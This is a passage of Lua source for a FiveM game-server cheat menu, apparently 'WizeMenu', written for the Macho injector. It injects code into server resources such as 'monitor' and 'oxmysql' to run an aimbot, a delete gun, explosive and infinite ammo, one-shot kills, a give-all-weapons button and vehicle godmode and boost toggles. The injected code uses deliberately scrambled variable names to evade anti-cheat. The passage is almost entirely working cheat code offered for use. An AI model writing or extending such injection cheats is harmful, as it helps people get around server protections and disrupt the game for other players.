local result, entity = GetEntityPlayerIsFreeAimingAt(player)
return entity
end
local function DeleteGunLoop()
local thread = CreateThread
thread(function()
while DeleteGun and not Unloaded do
local gotEntity = getEntity(PlayerId())
if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 0, false, true)
SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 0)
if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
if IsPlayerFreeAiming(PlayerId()) then
if IsEntityAPed(gotEntity) then
if IsPedInAnyVehicle(gotEntity, true) then
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
else
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
end
else
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
end
end
end
end
Wait(0)
end
end)
end
DeleteGunLoop()
]])
end, function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
DeleteGun = false
]])
end)


        MachoMenuCheckbox(WeaponTabSections[1], "AimBot [Risky]", function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
if aimbot == nil then aimbot = false end
aimbot = true
local function AimBotLoop()
local thread = CreateThread
thread(function()
while aimbot and not Unloaded do
for i = 0, 128 do
if i ~= PlayerId() then
if IsPlayerFreeAiming(PlayerId()) then
local TargetPed = GetPlayerPed(i)
local TargetPos = GetEntityCoords(TargetPed)
local Exist = DoesEntityExist(TargetPed)
local Dead = IsPlayerDead(TargetPed)
if Exist and not Dead then
local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
if IsEntityVisible(TargetPed) and OnScreen then
if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
end
end
end
end
end
end
Wait(0)
end
end)
end
AimBotLoop()
]])
end, function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
aimbot = false
]])
end)

        MachoMenuCheckbox(WeaponTabSections[1], "Infinite Ammo", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                LkJgFdSaQwErTy = true

                local function qUwKZopRM8()
                    if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                    LkJgFdSaQwErTy = true

                    local MnBvCxZlKjHgFd = CreateThread
                    MnBvCxZlKjHgFd(function()
                        local AsDfGhJkLzXcVb = PlayerPedId
                        local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                        local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                        local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                        local GhJkLzXcVbNmQw = SetPedAmmo

                        while LkJgFdSaQwErTy and not Unloaded do
                            local ped = AsDfGhJkLzXcVb()
                            local weapon = ZxCvBnMqWeRtYu(ped)

                            QwErTyUiOpAsDf(ped, true)

                            if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                                GhJkLzXcVbNmQw(ped, weapon, 250)
                            end

                            Wait(0)
                        end
                    end)
                end

                qUwKZopRM8()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                LkJgFdSaQwErTy = false

                local function yFBN9pqXcL()
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                    QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
                end

                yFBN9pqXcL()
            ]])
        end)

        MachoMenuCheckbox(WeaponTabSections[1], "Explosive Ammo", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                QzWxEdCvTrBnYu = true

                local function WpjLRqtm28()
                    if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                    QzWxEdCvTrBnYu = true

                    local UyJhNbGtFrVbCx = CreateThread
                    UyJhNbGtFrVbCx(function()
                        local HnBvFrTgYhUzKl = PlayerPedId
                        local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                        local JkLpHgTfCvXzQa = AddOwnedExplosion

                        while QzWxEdCvTrBnYu and not Unloaded do
                            local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                            local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                            if XsWaQzEdCvTrBn then
                                JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                WpjLRqtm28()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                QzWxEdCvTrBnYu = false
            ]])
        end)

        MachoMenuCheckbox(WeaponTabSections[1], "Oneshot Kill", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
                RfGtHyUjMiKoLp = true

                local function xUQp7AK0tv()
                    local PlMnBvCxZaSdFg = CreateThread
                    PlMnBvCxZaSdFg(function()
                        local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                        local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                        local ErTyUiOpAsDfGh = PlayerPedId

                        while RfGtHyUjMiKoLp do
                            if Unloaded then
                                RfGtHyUjMiKoLp = false
                                break
                            end

                            local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                            if Wp and Wp ~= 0 then
                                AsDfGhJkLzXcVb(Wp, 1000.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                xUQp7AK0tv()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                RfGtHyUjMiKoLp = false
                local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                local ErTyUiOpAsDfGh = PlayerPedId
                local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                if Wp and Wp ~= 0 then
                    AsDfGhJkLzXcVb(Wp, 1.0)
                end
            ]])
        end)

        
        MachoMenuButton(WeaponTabSections[2], "Give All Weapons + Max Ammo", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function GiveAllWeapons()
            local ped = PlayerPedId()
            local ammo = 1200

            local weapons = {
                -- MELEE
                "WEAPON_UNARMED",
                "WEAPON_KNIFE",
                "WEAPON_KNUCKLE",
                "WEAPON_NIGHTSTICK",
                "WEAPON_HAMMER",
                "WEAPON_BAT",
                "WEAPON_GOLFCLUB",
                "WEAPON_CROWBAR",
                "WEAPON_BOTTLE",
                "WEAPON_DAGGER",
                "WEAPON_HATCHET",
                "WEAPON_MACHETE",
                "WEAPON_FLASHLIGHT",
                "WEAPON_SWITCHBLADE",
                "WEAPON_POOLCUE",
                "WEAPON_PIPEWRENCH",

                -- HANDGUNS
                "WEAPON_PISTOL",
                "WEAPON_PISTOL_MK2",
                "WEAPON_COMBATPISTOL",
                "WEAPON_APPISTOL",
                "WEAPON_REVOLVER",
                "WEAPON_REVOLVER_MK2",
                "WEAPON_DOUBLEACTION",
                "WEAPON_PISTOL50",
                "WEAPON_SNSPISTOL",
                "WEAPON_SNSPISTOL_MK2",
                "WEAPON_HEAVYPISTOL",
                "WEAPON_VINTAGEPISTOL",
                "WEAPON_STUNGUN",
                "WEAPON_FLAREGUN",
                "WEAPON_MARKSMANPISTOL",
                "WEAPON_RAYPISTOL",
                "WEAPON_CERAMICPISTOL",
                "WEAPON_NAVYREVOLVER",
                "WEAPON_GADGETPISTOL",

                -- SMGs & MG
                "WEAPON_MICROSMG",
                "WEAPON_MINISMG",
                "WEAPON_SMG",
                "WEAPON_SMG_MK2",
                "WEAPON_ASSAULTSMG",
                "WEAPON_COMBATPDW",
                "WEAPON_MACHINEPISTOL",
                "WEAPON_MG",
                "WEAPON_COMBATMG",
                "WEAPON_COMBATMG_MK2",
                "WEAPON_GUSENBERG",

                -- ASSAULT RIFLES
                "WEAPON_ASSAULTRIFLE",
                "WEAPON_ASSAULTRIFLE_MK2",
                "WEAPON_CARBINERIFLE",
                "WEAPON_CARBINERIFLE_MK2",
                "WEAPON_ADVANCEDRIFLE",
                "WEAPON_SPECIALCARBINE",
                "WEAPON_SPECIALCARBINE_MK2",
                "WEAPON_BULLPUPRIFLE",
                "WEAPON_BULLPUPRIFLE_MK2",
                "WEAPON_COMPACTRIFLE",
                "WEAPON_MILITARYRIFLE",
                "WEAPON_HEAVYRIFLE",

                -- SHOTGUNS
                "WEAPON_PUMPSHOTGUN",
                "WEAPON_PUMPSHOTGUN_MK2",
                "WEAPON_SAWNOFFSHOTGUN",
                "WEAPON_BULLPUPSHOTGUN",
                "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET",
                "WEAPON_HEAVYSHOTGUN",
                "WEAPON_DBSHOTGUN",
                "WEAPON_AUTOSHOTGUN",
                "WEAPON_BATTLEAXE",
                "WEAPON_COMPACTLAUNCHER",

                -- SNIPER RIFLES
                "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER",
                "WEAPON_HEAVYSNIPER_MK2",
                "WEAPON_MARKSMANRIFLE",
                "WEAPON_MARKSMANRIFLE_MK2",

                -- HEAVY / THROWABLE
                "WEAPON_GRENADELAUNCHER",
                "WEAPON_GRENADELAUNCHER_SMOKE",
                "WEAPON_RPG",
                "WEAPON_STINGER",
                "WEAPON_FIREWORK",
                "WEAPON_HOMINGLAUNCHER",
                "WEAPON_GRENADELAUNCHER",
                "WEAPON_COMPACTLAUNCHER",
                "WEAPON_RAILGUN",
                "WEAPON_MINIGUN",
                "WEAPON_RAYMINIGUN",
                "WEAPON_RAYCARBINE",

                -- THROWABLES
                "WEAPON_GRENADE",
                "WEAPON_STICKYBOMB",
                "WEAPON_PROXMINE",
                "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE",
                "WEAPON_MOLOTOV",
                "WEAPON_FIREEXTINGUISHER",
                "WEAPON_PETROLCAN",
                "WEAPON_BALL",
                "WEAPON_SNOWBALL",
                "WEAPON_FLARE",
                "WEAPON_BIRDCRAP"
            }

            -- Remove current weapons
            RemoveAllPedWeapons(ped, true)

            -- Give all weapons with max ammo
            for _, weaponName in ipairs(weapons) do
                local hash = GetHashKey(weaponName)
                GiveWeaponToPed(ped, hash, ammo, false, true)
                SetPedInfiniteAmmo(ped, true, hash)
            end

            -- Select first weapon
            SetCurrentPedWeapon(ped, GetHashKey("WEAPON_PISTOL"), true)
        end

        GiveAllWeapons()
        print("^2[WizeMenu] All weapons given + max ammo!")
    ]])
end)

        --local WeaponHandle = MachoMenuInputbox(WeaponTabSections[2], "Weapon:", "...")

        --MachoMenuButton(WeaponTabSections[2], "Spawn Weapon 2", function()
            --local gNpLmKjHyUjIqEr = MachoMenuGetInputbox(WeaponSpawnerBox)

        --    if gNpLmKjHyUjIqEr and gNpLmKjHyUjIqEr ~= "" then
                --MachoInjectResource(CheckResource("monitor") and "monitor" or "any", string.format([[        
                    --local function ntQ3LbwJxZ()
                        --local LpKoMnJbHuGyTf = CreateThread
                        --LpKoMnJbHuGyTf(function()
                            --local SxWaQzEdCvTrBn = GetHashKey
                            --local TyGuJhNbVfCrDx = RequestWeaponAsset
                            --local UiJmNbGtFrVbCx = HasWeaponAssetLoaded
                            --local XeCwVrBtNuMyLk = GiveWeaponToPed
                            --local IuJhNbVgTfCvXz = PlayerPedId

                            --local DfGhJkLpPoNmZx = SxWaQzEdCvTrBn("%s")
                            --TyGuJhNbVfCrDx(DfGhJkLpPoNmZx, 31, 0)

                            --while not UiJmNbGtFrVbCx(DfGhJkLpPoNmZx) do
                                --Wait(0)
                            --end

                            --XeCwVrBtNuMyLk(IuJhNbVgTfCvXz(), DfGhJkLpPoNmZx, 250, true, true)
                        --end)
                    --end

                    --ntQ3LbwJxZ()
                --]], gNpLmKjHyUjIqEr))
            --end
        --end)

        local AnimationDropDownChoice = 0

        local AnimationMap = {
            [0] = { name = "Default", hash = "MP_F_Freemode" },
            [1] = { name = "Gangster", hash = "Gang1H" },
            [2] = { name = "Wild", hash = "GangFemale" },
            [3] = { name = "Red Neck", hash = "Hillbilly" }
        }

        MachoMenuDropDown(WeaponTabSections[3], "Aiming Style", function(index)
            AnimationDropDownChoice = index
        end,
            "Default",
            "Gangster",
            "Wild",
            "Red Neck"
        )

        MachoMenuButton(WeaponTabSections[3], "Apply Aiming Style", function()
            local Animation = AnimationMap[AnimationDropDownChoice]
            if not Animation then return end

            MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
                local function vXK2dPLR07()
                    local UiOpAsDfGhJkLz = PlayerPedId
                    local PlMnBvCxZaSdFg = GetHashKey
                    local QwErTyUiOpAsDf = SetWeaponAnimationOverride

                    local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
                    QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
                end

                vXK2dPLR07()

            ]]):format(Animation.hash))
        end)

        -- Vehicle Tab
        MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Godmode", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                zXcVbNmQwErTyUi = true

                local function LWyZoXRbqK()
                    local LkJhGfDsAzXcVb = CreateThread
                    LkJhGfDsAzXcVb(function()
                        while zXcVbNmQwErTyUi and not Unloaded do
                            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                            local TyUiOpAsDfGhJkL = PlayerPedId
                            local AsDfGhJkLzXcVbN = SetEntityInvincible

                            local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                            if vehicle and vehicle ~= 0 then
                                AsDfGhJkLzXcVbN(vehicle, true)
                            end
                            Wait(0)
                        end
                    end)
                end

                LWyZoXRbqK()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                zXcVbNmQwErTyUi = false
                local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                local TyUiOpAsDfGhJkL = PlayerPedId
                local AsDfGhJkLzXcVbN = SetEntityInvincible

                local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
                if vehicle and vehicle ~= 0 then
                    AsDfGhJkLzXcVbN(vehicle, false)
                end
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Force Vehicle Engine", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                GhYtReFdCxWaQzLp = true

                local function OpAsDfGhJkLzXcVb()
                    local lMnbVcXzZaSdFg = CreateThread
                    lMnbVcXzZaSdFg(function()
                        local QwErTyUiOp         = _G.PlayerPedId
                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                        local function _tick(vh)
                            if vh and vh ~= 0 then
                                No_Hotwire_Set(vh, false)
                                En_g_Degrade_Set(vh, false)
                                ErTyUiOpAsDfGh(vh, false)
                                KeEpOnAb(vh, true)

                                local eh = En_g_Health_Get(vh)
                                if (not eh) or eh < 300.0 then
                                    En_g_Health_Set(vh, 900.0)
                                end

                                ZxCvBnMqWeRtYu(vh, true, true, true)
                            end
                        end

                        while GhYtReFdCxWaQzLp and not Unloaded do
                            local p  = QwErTyUiOp()

                            _tick(AsDfGhJkLz(p, false))
                            _tick(TyUiOpAsDfGh(p))
                            _tick(AsDfGhJkLz(p, true))

                            Wait(0)
                        end
                    end)
                end

                OpAsDfGhJkLzXcVb()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                GhYtReFdCxWaQzLp = false
                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                if v and v ~= 0 then
                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                    SetVehicleEngineCanDegrade(v, true)
                    SetVehicleUndriveable(v, false)
                end
            ]])
        end)


        MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Auto Repair", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
                PlAsQwErTyUiOp = true

                local function uPkqLXTm98()
                    local QwErTyUiOpAsDf = CreateThread
                    QwErTyUiOpAsDf(function()
                        while PlAsQwErTyUiOp and not Unloaded do
                            local AsDfGhJkLzXcVb = PlayerPedId
                            local LzXcVbNmQwErTy = GetVehiclePedIsIn
                            local VbNmLkJhGfDsAz = SetVehicleFixed
                            local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                            local ped = AsDfGhJkLzXcVb()
                            local vehicle = LzXcVbNmQwErTy(ped, false)
                            if vehicle and vehicle ~= 0 then
                                VbNmLkJhGfDsAz(vehicle)
                                MnBvCxZaSdFgHj(vehicle, 0.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                uPkqLXTm98()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                PlAsQwErTyUiOp = false
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Freeze Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
                LzKxWcVbNmQwErTy = true

                local function WkQ79ZyLpT()
                    local tYhGtFrDeSwQaZx = CreateThread
                    local xCvBnMqWeRtYuIo = PlayerPedId
                    local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
                    local gKdNqLpYxMiV = FreezeEntityPosition
                    local jBtWxFhPoZuR = Wait

                    tYhGtFrDeSwQaZx(function()
                        while LzKxWcVbNmQwErTy and not Unloaded do
                            local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                            local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                            if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                                gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                            end
                            jBtWxFhPoZuR(0)
                        end
                    end)
                end

                WkQ79ZyLpT()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                LzKxWcVbNmQwErTy = false

                local function i7qWlBXtPo()
                    local yUiOpAsDfGhJkLz = PlayerPedId
                    local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                    local FdSaPlMnBvCxZlK = FreezeEntityPosition

                    local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
                    local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
                    if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                        FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
                    end
                end

                i7qWlBXtPo()
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Hop", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
                NuRqVxEyKiOlZm = true

                local function qPTnXLZKyb()
                    local ZlXoKmVcJdBeTr = CreateThread
                    ZlXoKmVcJdBeTr(function()
                        while NuRqVxEyKiOlZm and not Unloaded do
                            local GvHnMzLoPqAxEs = PlayerPedId
                            local DwZaQsXcErDfGt = GetVehiclePedIsIn
                            local BtNhUrLsEkJmWq = IsDisabledControlPressed
                            local PlZoXvNyMcKwQi = ApplyForceToEntity

                            local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                            local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                            if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                                PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                            end

                            Wait(0)
                        end
                    end)
                end

                qPTnXLZKyb()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                NuRqVxEyKiOlZm = false
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Rainbow Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                GxRpVuNzYiTq = true

                local function jqX7TvYzWq()
                    local WvBnMpLsQzTx = GetGameTimer
                    local VcZoPwLsEkRn = math.floor
                    local DfHkLtQwAzCx = math.sin
                    local PlJoQwErTgYs = CreateThread
                    local MzLxVoKsUyNz = GetVehiclePedIsIn
                    local EyUiNkOpLtRg = PlayerPedId
                    local KxFwEmTrZpYq = DoesEntityExist
                    local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                    local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

                    local yGfTzLkRn = 1.0

                    local function HrCvWbXuNz(freq)
                        local color = {}
                        local t = WvBnMpLsQzTx() / 1000
                        color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                        color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                        color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                        return color
                    end

                    PlJoQwErTgYs(function()
                        while GxRpVuNzYiTq and not Unloaded do
                            local ped = EyUiNkOpLtRg()
                            local veh = MzLxVoKsUyNz(ped, false)
                            if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                local rgb = HrCvWbXuNz(yGfTzLkRn)
                                UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                            end
                            Wait(0)
                        end
                    end)
                end

                jqX7TvYzWq()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                GxRpVuNzYiTq = false
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Drift Mode (Hold Shift)", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
                MqTwErYuIoLp = true

                local function PlRtXqJm92()
                    local XtFgDsQwAzLp = CreateThread
                    local UiOpAsDfGhKl = PlayerPedId
                    local JkHgFdSaPlMn = GetVehiclePedIsIn
                    local WqErTyUiOpAs = IsControlPressed
                    local AsZxCvBnMaSd = DoesEntityExist
                    local KdJfGvBhNtMq = SetVehicleReduceGrip

                    XtFgDsQwAzLp(function()
                        while MqTwErYuIoLp and not Unloaded do
                            Wait(0)
                            local ped = UiOpAsDfGhKl()
                            local veh = JkHgFdSaPlMn(ped, false)
                            if veh ~= 0 and AsZxCvBnMaSd(veh) then
                                if WqErTyUiOpAs(0, 21) then
                                    KdJfGvBhNtMq(veh, true)
                                else
                                    KdJfGvBhNtMq(veh, false)
                                end
                            end
                        end
                    end)
                end

                PlRtXqJm92()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                MqTwErYuIoLp = false
                local ZtQwErTyUiOp = PlayerPedId
                local DfGhJkLzXcVb = GetVehiclePedIsIn
                local VbNmAsDfGhJk = DoesEntityExist
                local NlJkHgFdSaPl = SetVehicleReduceGrip

                local ped = ZtQwErTyUiOp()
                local veh = DfGhJkLzXcVb(ped, false)
                if veh ~= 0 and VbNmAsDfGhJk(veh) then
                    NlJkHgFdSaPl(veh, false)
                end
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Easy Handling", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                NvGhJkLpOiUy = true

                local function KbZwVoYtLx()
                    local BtGhYtUlOpLk = CreateThread
                    local WeRtYuIoPlMn = PlayerPedId
                    local TyUiOpAsDfGh = GetVehiclePedIsIn
                    local UyTrBnMvCxZl = SetVehicleGravityAmount
                    local PlMnBvCxZaSd = SetVehicleStrong

                    BtGhYtUlOpLk(function()
                        while NvGhJkLpOiUy and not Unloaded do
                            local ped = WeRtYuIoPlMn()
                            local veh = TyUiOpAsDfGh(ped, false)
                            if veh and veh ~= 0 then
                                UyTrBnMvCxZl(veh, 73.0)
                                PlMnBvCxZaSd(veh, true)
                            end
                            Wait(0)
                        end

                        local ped = WeRtYuIoPlMn()
                        local veh = TyUiOpAsDfGh(ped, false)
                        if veh and veh ~= 0 then
                            UyTrBnMvCxZl(veh, 9.8)
                            PlMnBvCxZaSd(veh, false)
                        end
                    end)
                end

                KbZwVoYtLx()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                NvGhJkLpOiUy = false
                local UyTrBnMvCxZl = SetVehicleGravityAmount
                local PlMnBvCxZaSd = SetVehicleStrong
                local ped = PlayerPedId()
                local veh = GetVehiclePedIsIn(ped, false)
                if veh and veh ~= 0 then
                    UyTrBnMvCxZl(veh, 9.8)
                    PlMnBvCxZaSd(veh, false)
                end
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Shift Boost", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
                QwErTyUiOpSh = true

                local function ZxCvBnMmLl()
                    local aAaBbCcDdEe = CreateThread
                    local fFfGgGgHhIi = Wait
                    local jJkKlLmMnNo = PlayerPedId
                    local pPqQrRsStTu = IsPedInAnyVehicle
                    local vVwWxXyYzZa = GetVehiclePedIsIn
                    local bBcCdDeEfFg = IsDisabledControlJustPressed
                    local sSeEtTvVbBn = SetVehicleForwardSpeed

                    aAaBbCcDdEe(function()
                        while QwErTyUiOpSh and not Unloaded do
                            local _ped = jJkKlLmMnNo()
                            if pPqQrRsStTu(_ped, false) then
                                local _veh = vVwWxXyYzZa(_ped, false)
                                if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                                    sSeEtTvVbBn(_veh, 150.0)
                                end
                            end
                            fFfGgGgHhIi(0)
                        end
                    end)
                end

                ZxCvBnMmLl()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                QwErTyUiOpSh = false
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Instant Breaks", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                VkLpOiUyTrEq = true

                local function YgT7FrqXcN()
                    local ZxSeRtYhUiOp = CreateThread
                    local LkJhGfDsAzXv = PlayerPedId
                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                    local ErTyUiOpAsDf = IsDisabledControlPressed
                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                    local VbNmQwErTyUi = SetVehicleForwardSpeed

                    ZxSeRtYhUiOp(function()
                        while VkLpOiUyTrEq and not Unloaded do
                            local ped = LkJhGfDsAzXv()
                            local veh = PoLkJhBgVfCd(ped, false)
                            if veh and veh ~= 0 then
                                if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                    VbNmQwErTyUi(veh, 0.0)
                                end
                            end
                            Wait(0)
                        end
                    end)
                end

                YgT7FrqXcN()
            ]])
        end, function()
